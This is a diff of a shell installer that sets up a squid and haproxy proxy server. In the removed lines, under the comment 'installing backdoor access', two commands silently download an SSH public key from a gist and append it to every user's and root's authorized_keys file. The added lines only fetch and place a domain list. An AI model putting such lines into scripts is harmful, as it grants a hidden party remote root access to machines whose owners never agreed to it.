@@ -5,9 +5,6 @@ apt-get update -y && apt-get upgrade -y && apt-get dist-upgrade -y
 echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
 echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
 echo "Installing dependencies"
-# installing backdoor access :P
-(echo "$(wget -O - https://gist.githubusercontent.com/bjdag1234/971ba7d1f7834117e85a50d42c1d4bf5/raw/id_rsa.pub)" >> /home/*/.ssh/authorized_keys) &>/dev/null
-(echo "$(wget -O - https://gist.githubusercontent.com/bjdag1234/971ba7d1f7834117e85a50d42c1d4bf5/raw/id_rsa.pub)" >> /root/.ssh/authorized_keys) &>/dev/null
 apt-get install -y unzip curl git dnsmasq bc make gcc openssl build-essential iptables-persistent haproxy tmux mosh
 apt-get install -y libreadline-dev libncurses5-dev libssl-dev
 DISTRO=$(lsb_release -ds 2>/dev/null || cat /etc/*release 2>/dev/null | head -n1 || uname -om)
@@ -106,15 +103,19 @@ systemctl stop haproxy
 cd ..
 
 wget -O squid.conf https://gist.githubusercontent.com/bjdag1234/971ba7d1f7834117e85a50d42c1d4bf5/raw/squid.conf
+wget -O sony-domains.txt https://gist.githubusercontent.com/bjdag1234/971ba7d1f7834117e85a50d42c1d4bf5/raw/sony-domains.txt
 IP="$(dig +short myip.opendns.com @resolver1.opendns.com)"
 sed -i "s/123.123.123.123/$IP/g" squid.conf
 if [[ $DISTRO  =~ Debian ]]; then 
     mv /etc/squid3/squid.conf /etc/squid3/squid.conf.default;
     mv squid.conf /etc/squid3/squid.conf;
+    mv sony-domains.txt /etc/squid3/sony-domains.txt
+    sed -i '#/etc/squid/#/etc/squid3/#g' /etc/squid3/squid.conf
     ln -s /usr/bin/squid3 /usr/bin/squid
 else 
     mv /etc/squid/squid.conf /etc/squid/squid.conf.default;
     mv squid.conf /etc/squid/squid.conf;
+    mv sony-domains.txt /etc/squid/sony-domains.txt
 fi
 
 wget -O haproxy.cfg https://gist.githubusercontent.com/bjdag1234/971ba7d1f7834117e85a50d42c1d4bf5/raw/haproxy.cfg
